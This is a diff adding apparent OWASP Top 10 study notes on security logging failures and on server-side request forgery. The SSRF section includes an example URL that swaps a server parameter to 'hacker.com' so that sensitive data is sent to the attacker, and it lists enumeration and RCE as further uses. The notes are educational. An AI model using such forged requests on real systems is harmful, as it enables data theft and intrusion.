@@ -81,6 +81,33 @@ Taking the JWT from before as an example, if we wanted to change the payload so 
 ![[Pasted image 20240302000639.png]]
 
 # 9. Security Logging & Monitoring Failures
-
+When web applications are set up, every action performed by the user should be logged. Logging is important, because in the event of an incident, the attacker's activities can be traced. Without logging, there would be no way to tell what actions were performed by an attacker if they gain access to particular web applications. 
+The information stored in logs should include the following:
+- HTTP status codes
+- Time Stamps
+- Usernames
+- API endpoints/page locations
+- IP addresses
+As these have some sensitive information it is important that they are stored securely and that multiple copies of these logs are stored at different locations.
+The ideal case is to have monitoring in place to detect any suspicious activity. The aim of detecting this suspicious activity is to either stop the attacker completely or reduce the impact they've made if their presence has been detected much later than anticipated.  
 
 # 10. SSRF
+Server-Side Request Forgery, this type of vulnerability occurs when an attacker can coerce a web application into sending request on their behalf to arbitrary destinations while having control of the contents of the request itself. SSRF vulnerabilities often arise form implementations where our web application needs to use third-party services.
+An easy example is whenever a server is trying to use an intermediary website to send a secret message it could maybe look like this
+```
+https://website.com/homepage?server=sender.com&msg=hallo
+```
+Then the server will build a query to the third-party server to send the message
+```
+https://sender.com/send?msg=hallo
+```
+and forward that request to it. 
+If for example the server were to also send sensitive data in that request we could make and forge our own server to make the request send it to ourselves instead by just changing the request
+```
+https://website.com/homepage?server=hacker.com&msg=hallo
+```
+This way we would intercept the information. 
+Now, depending on the scenario this could also be used for:
+- Enumerate internal networks
+- Abuse trust relationships between servers and gain access to otherwise restricted services
+- Interact with some non-HTTP services to get RCE
